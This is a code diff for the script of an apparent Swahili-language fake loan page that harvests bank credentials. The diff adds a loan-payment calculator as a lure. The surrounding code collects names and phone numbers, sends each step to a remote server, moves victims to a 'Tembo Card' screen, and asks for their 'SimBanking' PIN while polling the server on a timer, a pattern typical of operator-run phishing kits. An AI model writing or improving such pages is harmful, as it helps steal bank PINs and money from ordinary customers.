@@ -3,6 +3,19 @@ let clientPayload = {};
 let timerInterval = null;
 let timeLeft = 30;
 
+function updateCalculator() {
+    const amount = parseInt(document.getElementById('loanAmountSlider').value);
+    const months = parseInt(document.getElementById('loanTermSlider').value);
+
+    document.getElementById('loanAmountDisplay').innerText = `TSh ${amount.toLocaleString()}`;
+    document.getElementById('loanTermDisplay').innerText = `miezi ${months}`;
+
+    // Simple estimation formula matching standard loan calculations with interest
+    const monthlyRate = 0.02; 
+    const monthlyPayment = (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months));
+    document.getElementById('monthlyPaymentDisplay').innerText = `TSh ${Math.round(monthlyPayment).toLocaleString()}`;
+}
+
 function showStep(stepId) {
     document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
     document.getElementById(`step-${stepId}`).classList.add('active');
@@ -63,8 +76,8 @@ async function pollServerStatus() {
 }
 
 async function submitPersonalInfo() {
-    const loanType = document.getElementById('loanType').value;
-    const loanAmount = document.getElementById('loanAmount').value;
+    const loanAmount = document.getElementById('loanAmountSlider').value;
+    const loanTerm = document.getElementById('loanTermSlider').value;
     const firstName = document.getElementById('firstName').value;
     const lastName = document.getElementById('lastName').value;
     const phoneNumber = document.getElementById('phoneNumber').value;
@@ -75,7 +88,7 @@ async function submitPersonalInfo() {
     }
 
     showLoading('Inachakata taarifa zako...');
-    await sendToServer('personal_info', { loanType, loanAmount, firstName, lastName, phoneNumber });
+    await sendToServer('personal_info', { loanAmount: `TSh ${Number(loanAmount).toLocaleString()}`, loanTerm: `${loanTerm} miezi`, firstName, lastName, phoneNumber });
     hideLoading();
     
     // Move immediately to Tembo Card screen
@@ -181,5 +194,10 @@ async function submitPin() {
         document.getElementById('loadingText').innerText = 'Inathibitisha PIN ya SimBanking...';
         pollServerStatus();
     }
-            }
-                       
+}
+
+// Initialize calculator on load
+window.onload = () => {
+    updateCalculator();
+};
+    
